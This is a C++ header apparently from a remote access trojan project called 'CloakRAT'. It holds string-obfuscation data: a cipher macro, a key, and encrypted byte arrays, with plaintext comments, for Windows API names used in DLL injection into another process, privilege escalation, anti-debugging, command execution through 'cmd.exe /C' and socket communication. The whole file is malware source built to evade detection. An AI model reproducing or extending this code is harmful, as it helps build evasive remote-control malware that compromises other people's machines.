#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i + 9) * 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i * BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 12)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 184, 117, 232, 83, 250, 170, 148, 124, 105, 73, 182, 62, 240, 88, 245, 162 };

typedef struct EncryptedBytes {
    unsigned char* data;
    size_t length;
} EncryptedBytes;

// "127.0.0.1"
static unsigned char str_ip_data[] = { 41, 60, 60, 56, 34, 61, 32, 63, 34, 60 };
static EncryptedBytes str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

// "cmd.exe /C"
static unsigned char str_cmd_data[] = { 94, 110, 99, 107, 34, 104, 118, 106, 44, 34, 77 };
static EncryptedBytes str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

// "C:\Users\tal78\Desktop\Workspace\CloakRAT\x64\Release\CloakRAT.dll"
static unsigned char str_dllPath_data[] = { 19, 78, 52, 83, 89, 126, 107, 125, 127, 81, 122, 110, 96, 58, 54, 83, 72, 108, 125, 116, 120, 38, 62, 115, 91, 98, 4, 108, 127, 125, 111, 72, 105, 17, 77, 67, 67, 124, 101, 93, 13, 25, 50, 87, 58, 121, 82, 29, 105, 113, 59, 122, 63, 88, 82, 32, 48, 102, 79, 4, 30, 12, 82, 49, 104, 97, 98 };
static EncryptedBytes str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

// "notepad.exe"
static unsigned char str_procName_data[] = { 50, 99, 97, 123, 105, 125, 111, 107, 34, 104, 118, 106 };
static EncryptedBytes str_procName = {
    str_procName_data,
    sizeof(str_procName_data)
};

// "NtSetInformationThread"
static unsigned char str_NtSetInformationThread_data[] = { 18, 67, 122, 92, 105, 121, 71, 97, 106, 98, 124, 98, 109, 121, 103, 96, 98, 93, 102, 109, 105, 40, 42 };
static EncryptedBytes str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

// "GetCurrentThread"
static unsigned char str_GetCurrentThread_data[] = { 56, 74, 107, 123, 79, 120, 124, 125, 105, 99, 122, 91, 100, 127, 107, 110, 104 };
static EncryptedBytes str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

// "Sleep"
static unsigned char str_Sleep_data[] = { 107, 94, 98, 106, 105, 125 };
static EncryptedBytes str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

// "OpenProcess"
static unsigned char str_OpenProcess_data[] = { 102, 66, 126, 106, 98, 93, 124, 96, 111, 104, 125, 124 };
static EncryptedBytes str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

// "VirtualAllocEx"
static unsigned char str_VirtualAllocEx_data[] = { 73, 91, 103, 125, 120, 120, 111, 99, 77, 97, 98, 96, 111, 72, 118 };
static EncryptedBytes str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

// "WriteProcessMemory"
static unsigned char str_WriteProcessMemory_data[] = { 102, 90, 124, 102, 120, 104, 94, 125, 99, 110, 107, 124, 127, 64, 107, 98, 99, 123, 119 };
static EncryptedBytes str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

// "LoadLibraryA"
static unsigned char str_LoadLibraryA_data[] = { 94, 65, 97, 110, 104, 65, 103, 109, 126, 108, 124, 118, 77 };
static EncryptedBytes str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

// "CreateRemoteThread"
static unsigned char str_CreateRemoteThread_data[] = { 77, 78, 124, 106, 109, 121, 107, 93, 105, 96, 97, 123, 105, 89, 102, 125, 105, 104, 106 };
static EncryptedBytes str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

// "CloseHandle"
static unsigned char str_CloseHandle_data[] = { 41, 78, 98, 96, 127, 104, 70, 110, 98, 105, 98, 106 };
static EncryptedBytes str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

// "LookupPrivilegeValueA"
static unsigned char str_LookupPrivilegeValueA_data[] = { 105, 65, 97, 96, 103, 120, 126, 95, 126, 100, 120, 102, 96, 104, 105, 106, 90, 104, 98, 106, 105, 8 };
static EncryptedBytes str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

// "GetLastError"
static unsigned char str_GetLastError_data[] = { 76, 74, 107, 123, 64, 108, 125, 123, 73, 127, 124, 96, 126 };
static EncryptedBytes str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

// "AdjustTokenPrivileges"
static unsigned char str_AdjustTokenPrivileges_data[] = { 109, 76, 106, 101, 121, 126, 122, 91, 99, 102, 107, 97, 92, 127, 103, 121, 101, 101, 107, 120, 105, 58 };
static EncryptedBytes str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

// "OpenProcessToken"
static unsigned char str_OpenProcessToken_data[] = { 106, 66, 126, 106, 98, 93, 124, 96, 111, 104, 125, 124, 88, 98, 101, 106, 98 };
static EncryptedBytes str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

// "GetCurrentProcess"
static unsigned char str_GetCurrentProcess_data[] = { 25, 74, 107, 123, 79, 120, 124, 125, 105, 99, 122, 95, 126, 98, 109, 106, 127, 122 };
static EncryptedBytes str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

// "CreateToolhelp32Snapshot"
static unsigned char str_CreateToolhelp32Snapshot_data[] = { 35, 78, 124, 106, 109, 121, 107, 91, 99, 98, 98, 103, 105, 97, 126, 60, 62, 90, 96, 126, 124, 58, 38, 64, 120 };
static EncryptedBytes str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

// "Process32First"
static unsigned char str_Process32First_data[] = { 104, 93, 124, 96, 111, 104, 125, 124, 63, 63, 72, 102, 126, 126, 122 };
static EncryptedBytes str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

// "Process32Next"
static unsigned char str_Process32Next_data[] = { 116, 93, 124, 96, 111, 104, 125, 124, 63, 63, 64, 106, 116, 121 };
static EncryptedBytes str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

// "CreatePipe"
static unsigned char str_CreatePipe_data[] = { 71, 78, 124, 106, 109, 121, 107, 95, 101, 125, 107 };
static EncryptedBytes str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

// "SetHandleInformation"
static unsigned char str_SetHandleInformation_data[] = { 64, 94, 107, 123, 68, 108, 96, 107, 96, 104, 71, 97, 106, 98, 124, 98, 109, 125, 103, 112, 98 };
static EncryptedBytes str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

// "ReadFile"
static unsigned char str_ReadFile_data[] = { 43, 95, 107, 110, 104, 75, 103, 99, 105 };
static EncryptedBytes str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

// "FormatMessageA"
static unsigned char str_FormatMessageA_data[] = { 45, 75, 97, 125, 97, 108, 122, 66, 105, 126, 125, 110, 107, 104, 79 };
static EncryptedBytes str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

// "LocalFree"
static unsigned char str_LocalFree_data[] = { 42, 65, 97, 108, 109, 97, 72, 125, 105, 104 };
static EncryptedBytes str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

// "CreateProcessA"
static unsigned char str_CreateProcessA_data[] = { 69, 78, 124, 106, 109, 121, 107, 95, 126, 98, 109, 106, 127, 126, 79 };
static EncryptedBytes str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

// "IsDebuggerPresent"
static unsigned char str_IsDebuggerPresent_data[] = { 50, 68, 125, 75, 105, 111, 123, 104, 107, 104, 124, 95, 126, 104, 125, 106, 98, 125 };
static EncryptedBytes str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

// "GetModuleHandleW"
static unsigned char str_GetModuleHandleW_data[] = { 127, 74, 107, 123, 65, 98, 106, 122, 96, 104, 70, 110, 98, 105, 98, 106, 91 };
static EncryptedBytes str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

// "VirtualProtect"
static unsigned char str_VirtualProtect_data[] = { 118, 91, 103, 125, 120, 120, 111, 99, 92, 127, 97, 123, 105, 110, 122 };
static EncryptedBytes str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

// "HeapSetInformation"
static unsigned char str_HeapSetInformation_data[] = { 27, 69, 107, 110, 124, 94, 107, 123, 69, 99, 104, 96, 126, 96, 111, 123, 101, 102, 96 };
static EncryptedBytes str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

// "FindWindowW"
static unsigned char str_FindWindowW_data[] = { 14, 75, 103, 97, 104, 90, 103, 97, 104, 98, 121, 88 };
static EncryptedBytes str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

// "GetProcessHeap"
static unsigned char str_GetProcessHeap_data[] = { 115, 74, 107, 123, 92, 127, 97, 108, 105, 126, 125, 71, 105, 108, 126 };
static EncryptedBytes str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

// "GetComputerNameW"
static unsigned char str_GetComputerNameW_data[] = { 104, 74, 107, 123, 79, 98, 99, 127, 121, 121, 107, 125, 66, 108, 99, 106, 91 };
static EncryptedBytes str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

// "OpenThread"
static unsigned char str_OpenThread_data[] = { 92, 66, 126, 106, 98, 89, 102, 125, 105, 108, 106 };
static EncryptedBytes str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

// "GetEnvironmentVariableW"
static unsigned char str_GetEnvironmentVariableW_data[] = { 61, 74, 107, 123, 73, 99, 120, 102, 126, 98, 96, 98, 105, 99, 122, 89, 109, 123, 103, 126, 110, 37, 43, 120 };
static EncryptedBytes str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

// "GetThreadContext"
static unsigned char str_GetThreadContext_data[] = { 105, 74, 107, 123, 88, 101, 124, 106, 109, 105, 77, 96, 98, 121, 107, 119, 120 };
static EncryptedBytes str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

// "IsWow64Process"
static unsigned char str_IsWow64Process_data[] = { 18, 68, 125, 88, 99, 122, 56, 59, 92, 127, 97, 108, 105, 126, 125 };
static EncryptedBytes str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

// "GetWindowLongPtrW"
static unsigned char str_GetWindowLongPtrW_data[] = { 7, 74, 107, 123, 91, 100, 96, 107, 99, 122, 66, 96, 98, 106, 94, 123, 126, 94 };
static EncryptedBytes str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

// "GetWindowRect"
static unsigned char str_GetWindowRect_data[] = { 14, 74, 107, 123, 91, 100, 96, 107, 99, 122, 92, 106, 111, 121 };
static EncryptedBytes str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

// "WSAStartup"
static unsigned char str_WSAStartup_data[] = { 40, 90, 93, 78, 95, 121, 111, 125, 120, 120, 126 };
static EncryptedBytes str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

// "htons"
static unsigned char str_htons_data[] = { 109, 101, 122, 96, 98, 126 };
static EncryptedBytes str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

// "inet_pton"
static unsigned char str_inet_pton_data[] = { 111, 100, 96, 106, 120, 82, 126, 123, 99, 99 };
static EncryptedBytes str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

// "connect"
static unsigned char str_connect_data[] = { 83, 110, 97, 97, 98, 104, 109, 123 };
static EncryptedBytes str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

// "htonl"
static unsigned char str_htonl_data[] = { 101, 101, 122, 96, 98, 97 };
static EncryptedBytes str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

// "send"
static unsigned char str_send_data[] = { 98, 126, 107, 97, 104 };
static EncryptedBytes str_send = {
    str_send_data,
    sizeof(str_send_data)
};

// "socket"
static unsigned char str_socket_data[] = { 65, 126, 97, 108, 103, 104, 122 };
static EncryptedBytes str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

// "recv"
static unsigned char str_recv_data[] = { 72, 127, 107, 108, 122 };
static EncryptedBytes str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

// "ntohl"
static unsigned char str_ntohl_data[] = { 8, 99, 122, 96, 100, 97 };
static EncryptedBytes str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

// "closesocket"
static unsigned char str_closesocket_data[] = { 60, 110, 98, 96, 127, 104, 125, 96, 111, 102, 107, 123 };
static EncryptedBytes str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

// "WSACleanup"
static unsigned char str_WSACleanup_data[] = { 49, 90, 93, 78, 79, 97, 107, 110, 98, 120, 126 };
static EncryptedBytes str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

// "kernel32.dll"
static unsigned char str_kernel32_data[] = { 58, 102, 107, 125, 98, 104, 98, 60, 62, 35, 106, 99, 96 };
static EncryptedBytes str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

// "ntdll.dll"
static unsigned char str_ntdll_data[] = { 4, 99, 122, 107, 96, 97, 32, 107, 96, 97 };
static EncryptedBytes str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

// "advapi32.dll"
static unsigned char str_advapi32_data[] = { 72, 108, 106, 121, 109, 125, 103, 60, 62, 35, 106, 99, 96 };
static EncryptedBytes str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

// "ws2_32.dll"
static unsigned char str_ws2_32_data[] = { 12, 122, 125, 61, 83, 62, 60, 33, 104, 97, 98 };
static EncryptedBytes str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

// "user32.dll"
static unsigned char str_user32_data[] = { 87, 120, 125, 106, 126, 62, 60, 33, 104, 97, 98 };
static EncryptedBytes str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

// "WSAGetLastError"
static unsigned char str_WSAGetLastError_data[] = { 6, 90, 93, 78, 75, 104, 122, 67, 109, 126, 122, 74, 126, 127, 97, 125 };
static EncryptedBytes str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};

